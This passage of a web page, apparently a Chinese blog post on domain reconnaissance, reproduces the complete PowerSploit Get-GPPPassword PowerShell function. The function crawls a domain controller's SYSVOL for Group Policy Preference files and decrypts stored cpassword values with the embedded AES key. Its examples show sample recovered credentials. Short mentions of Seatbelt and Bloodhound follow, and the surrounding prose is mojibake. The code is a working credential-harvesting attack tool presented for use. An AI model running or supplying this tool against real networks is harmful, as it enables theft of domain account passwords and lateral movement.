class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Get-GPPPassword</span></span> &#123;</span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment"><span class="doctag">.SYNOPSIS</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PowerSploit Function: Get-GPPPassword</span></span><br><span class="line"><span class="comment">    Author: Chris Campbell (@obscuresec)</span></span><br><span class="line"><span class="comment">    License: BSD 3-Clause</span></span><br><span class="line"><span class="comment">    Required Dependencies: None</span></span><br><span class="line"><span class="comment">    Optional Dependencies: None</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"><span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.PARAMETER Server</span></span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Specify the domain controller to search for. </span></span><br><span class="line"><span class="comment">    Default&#x27;s to the users current domain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:28:53&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password12&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;test1&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\DataSources\DataSources.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : &#123;mspresenters&#125;</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;Recycling*3ftw!, password123, password1234&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;Administrator (built-in), DummyAccount, dummy2&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:29:53, 2014-02-21 05:29:52&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password, password1234$&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;administrator, admin&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:30:14, 2014-02-21 05:30:36&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password, read123&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;DEMO\Administrator, admin&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Services\Services.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword -Server EXAMPLE.COM</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:28:53&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password12&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;test1&#125;</span></span><br><span class="line"><span class="comment">    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB982DA&#125;\MACHINE\Preferences\DataSources\DataSources.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : &#123;mspresenters&#125;</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;Recycling*3ftw!, password123, password1234&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;Administrator (built-in), DummyAccount, dummy2&#125;</span></span><br><span class="line"><span class="comment">    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB9AB12&#125;\MACHINE\Preferences\Groups\Groups.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword | ForEach-Object &#123;$_.passwords&#125; | Sort-Object -Uniq</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    password</span></span><br><span class="line"><span class="comment">    password12</span></span><br><span class="line"><span class="comment">    password123</span></span><br><span class="line"><span class="comment">    password1234</span></span><br><span class="line"><span class="comment">    password1234$</span></span><br><span class="line"><span class="comment">    read123</span></span><br><span class="line"><span class="comment">    Recycling*3ftw!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.LINK</span></span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html</span></span><br><span class="line"><span class="comment">    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1</span></span><br><span class="line"><span class="comment">    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences</span></span><br><span class="line"><span class="comment">    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">    </span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">            [<span class="type">ValidateNotNullOrEmpty</span>()]</span><br><span class="line">            [<span class="built_in">String</span>]</span><br><span class="line">            <span class="variable">$Server</span> = <span class="variable">$Env:USERDNSDOMAIN</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Some XML issues between versions</span></span><br><span class="line">    <span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#define helper function that decodes and decrypts password</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-DecryptedCpassword</span></span> &#123;</span><br><span class="line">        [<span class="type">CmdletBinding</span>()]</span><br><span class="line">        <span class="keyword">Param</span> (</span><br><span class="line">            [<span class="built_in">string</span>] <span class="variable">$Cpassword</span> </span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">#Append appropriate padding based on string length  </span></span><br><span class="line">            <span class="variable">$Mod</span> = (<span class="variable">$Cpassword</span>.length % <span class="number">4</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$Mod</span>) &#123;</span><br><span class="line">            <span class="string">&#x27;1&#x27;</span> &#123;<span class="variable">$Cpassword</span> = <span class="variable">$Cpassword</span>.Substring(<span class="number">0</span>,<span class="variable">$Cpassword</span>.Length <span class="literal">-1</span>)&#125;</span><br><span class="line">            <span class="string">&#x27;2&#x27;</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">            <span class="string">&#x27;3&#x27;</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$Base64Decoded</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$Cpassword</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#Create a new AES .NET Crypto Object</span></span><br><span class="line">            <span class="variable">$AesObject</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesCryptoServiceProvider</span><br><span class="line">            [<span class="built_in">Byte</span>[]] <span class="variable">$AesKey</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x4e,<span class="number">0</span>x99,<span class="number">0</span>x06,<span class="number">0</span>xe8,<span class="number">0</span>xfc,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>xc9,<span class="number">0</span>xfa,<span class="number">0</span>xf4,<span class="number">0</span>x93,<span class="number">0</span>x10,<span class="number">0</span>x62,<span class="number">0</span>x0f,<span class="number">0</span>xfe,<span class="number">0</span>xe8,</span><br><span class="line">                                 <span class="number">0</span>xf4,<span class="number">0</span>x96,<span class="number">0</span>xe8,<span class="number">0</span>x06,<span class="number">0</span>xcc,<span class="number">0</span>x05,<span class="number">0</span>x79,<span class="number">0</span>x90,<span class="number">0</span>x20,<span class="number">0</span>x9b,<span class="number">0</span>x09,<span class="number">0</span>xa4,<span class="number">0</span>x33,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>x1b)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#Set IV to all nulls to prevent dynamic generation of IV value</span></span><br><span class="line">            <span class="variable">$AesIV</span> = <span class="built_in">New-Object</span> Byte[](<span class="variable">$AesObject</span>.IV.Length) </span><br><span class="line">            <span class="variable">$AesObject</span>.IV = <span class="variable">$AesIV</span></span><br><span class="line">            <span class="variable">$AesObject</span>.Key = <span class="variable">$AesKey</span></span><br><span class="line">            <span class="variable">$DecryptorObject</span> = <span class="variable">$AesObject</span>.CreateDecryptor() </span><br><span class="line">            [<span class="built_in">Byte</span>[]] <span class="variable">$OutBlock</span> = <span class="variable">$DecryptorObject</span>.TransformFinalBlock(<span class="variable">$Base64Decoded</span>, <span class="number">0</span>, <span class="variable">$Base64Decoded</span>.length)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> [<span class="type">System.Text.UnicodeEncoding</span>]::Unicode.GetString(<span class="variable">$OutBlock</span>)</span><br><span class="line">        &#125; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#define helper function to parse fields from xml files</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-GPPInnerFields</span></span> &#123;</span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">        <span class="keyword">Param</span> (</span><br><span class="line">            <span class="variable">$File</span></span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$Filename</span> = <span class="built_in">Split-Path</span> <span class="variable">$File</span> <span class="literal">-Leaf</span></span><br><span class="line">            [<span class="built_in">xml</span>] <span class="variable">$Xml</span> = <span class="built_in">Get-Content</span> (<span class="variable">$File</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#declare empty arrays</span></span><br><span class="line">            <span class="variable">$Cpassword</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$UserName</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$NewName</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$Changed</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$Password</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    </span><br><span class="line">            <span class="comment">#check for password field</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$Xml</span>.innerxml <span class="operator">-like</span> <span class="string">&quot;*cpassword*&quot;</span>)&#123;</span><br><span class="line">            </span><br><span class="line">                <span class="built_in">Write-Verbose</span> <span class="string">&quot;Potential password in <span class="variable">$File</span>&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$Filename</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="string">&#x27;Groups.xml&#x27;</span> &#123;</span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@userName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$NewName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@newName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;Services.xml&#x27;</span> &#123;  </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/Properties/@accountName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;Scheduledtasks.xml&#x27;</span> &#123;</span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/Properties/@runAs&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;DataSources.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;                          </span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="string">&#x27;Printers.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">  </span><br><span class="line">                    <span class="string">&#x27;Drives.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125; </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;</span><br><span class="line">                     </span><br><span class="line">           <span class="keyword">foreach</span> (<span class="variable">$Pass</span> <span class="keyword">in</span> <span class="variable">$Cpassword</span>) &#123;</span><br><span class="line">               <span class="built_in">Write-Verbose</span> <span class="string">&quot;Decrypting <span class="variable">$Pass</span>&quot;</span></span><br><span class="line">               <span class="variable">$DecryptedPassword</span> = <span class="built_in">Get-DecryptedCpassword</span> <span class="variable">$Pass</span></span><br><span class="line">               <span class="built_in">Write-Verbose</span> <span class="string">&quot;Decrypted a password of <span class="variable">$DecryptedPassword</span>&quot;</span></span><br><span class="line">               <span class="comment">#append any new passwords to array</span></span><br><span class="line">               <span class="variable">$Password</span> += , <span class="variable">$DecryptedPassword</span></span><br><span class="line">           &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#put [BLANK] in variables</span></span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$Password</span>)) &#123;<span class="variable">$Password</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$UserName</span>)) &#123;<span class="variable">$UserName</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$Changed</span>)) &#123;<span class="variable">$Changed</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$NewName</span>)) &#123;<span class="variable">$NewName</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">                  </span><br><span class="line">            <span class="comment">#Create custom object to output results</span></span><br><span class="line">            <span class="variable">$ObjectProperties</span> = <span class="selector-tag">@</span>&#123;<span class="string">&#x27;Passwords&#x27;</span> = <span class="variable">$Password</span>;</span><br><span class="line">                                  <span class="string">&#x27;UserNames&#x27;</span> = <span class="variable">$UserName</span>;</span><br><span class="line">                                  <span class="string">&#x27;Changed&#x27;</span> = <span class="variable">$Changed</span>;</span><br><span class="line">                                  <span class="string">&#x27;NewName&#x27;</span> = <span class="variable">$NewName</span>;</span><br><span class="line">                                  <span class="string">&#x27;File&#x27;</span> = <span class="variable">$File</span>&#125;</span><br><span class="line">                </span><br><span class="line">            <span class="variable">$ResultsObject</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> PSObject <span class="literal">-Property</span> <span class="variable">$ObjectProperties</span></span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;The password is between &#123;&#125; and may be more than one value.&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$ResultsObject</span>) &#123;<span class="keyword">Return</span> <span class="variable">$ResultsObject</span>&#125; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">#ensure that machine is domain joined and script is running as a domain account</span></span><br><span class="line">        <span class="keyword">if</span> ( ( ((<span class="built_in">Get-WmiObject</span> Win32_ComputerSystem).partofdomain) <span class="operator">-eq</span> <span class="variable">$False</span> ) <span class="operator">-or</span> ( <span class="operator">-not</span> <span class="variable">$Env:USERDNSDOMAIN</span> ) ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">&#x27;Machine is not a domain member or User is not a member of the domain.&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#discover potential files containing passwords ; not complaining in case of denied access to a directory</span></span><br><span class="line">        <span class="built_in">Write-Verbose</span> <span class="string">&quot;Searching \\<span class="variable">$Server</span>\SYSVOL. This could take a while.&quot;</span></span><br><span class="line">        <span class="variable">$XMlFiles</span> = <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&quot;\\<span class="variable">$Server</span>\SYSVOL&quot;</span> <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue <span class="literal">-Include</span> <span class="string">&#x27;Groups.xml&#x27;</span>,<span class="string">&#x27;Services.xml&#x27;</span>,<span class="string">&#x27;Scheduledtasks.xml&#x27;</span>,<span class="string">&#x27;DataSources.xml&#x27;</span>,<span class="string">&#x27;Printers.xml&#x27;</span>,<span class="string">&#x27;Drives.xml&#x27;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> ( <span class="operator">-not</span> <span class="variable">$XMlFiles</span> ) &#123;<span class="keyword">throw</span> <span class="string">&#x27;No preference files found.&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Write-Verbose</span> <span class="string">&quot;Found <span class="variable">$</span>(<span class="variable">$XMLFiles</span> | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords.&quot;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$File</span> <span class="keyword">in</span> <span class="variable">$XMLFiles</span>) &#123;</span><br><span class="line">            <span class="variable">$Result</span> = (<span class="built_in">Get-GppInnerFields</span> <span class="variable">$File</span>.Fullname)</span><br><span class="line">            <span class="built_in">Write-Output</span> <span class="variable">$Result</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h3><p>è¿™ä¸ªå·¥å…·èƒ½åšä¸€äº›è‡ªåŠ¨åŒ–çš„ä¿¡æ¯æ”¶é›†ï¼Œæ”¶é›†çš„ä¿¡æ¯å¾ˆå¤šï¼ŒåŒ…æ‹¬ä¸é™äºgoogleå†å²è®°å½•ã€ç”¨æˆ·ç­‰ç­‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#é¡¹ç›®åœ°å€</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;Seatbelt</span><br></pre></td></tr></table></figure><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Bloodhoundåšä¸€äº›è‡ªåŠ¨åŒ–çš„ä¿¡æ¯æ”¶é›†ï¼ŒåŒ…æ‹¬ç”¨æˆ·ã€è®¡ç®—æœºã€ç»„ç»‡æ¶æ„ã€æœ€å¿«çš„æ”»å‡»é€”å¾„ç­‰ã€‚ä½†æ˜¯è‡ªåŠ¨åŒ–ä¹Ÿæ„å‘³ç€å‘Šè­¦ï¼Œè¯¥æ¼æ´åšè‡ªåŠ¨åŒ–ä¿¡æ¯æ”¶é›†æ—¶ï¼Œä¼šåœ¨å†…ç½‘è®¾å¤‡ä¸Šäº§ç”Ÿå¤§é‡çš„å‘Šè­¦ï¼ŒæŒ‰éœ€ä½¿ç”¨ã€‚</p><p>é¡¹ç›®åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 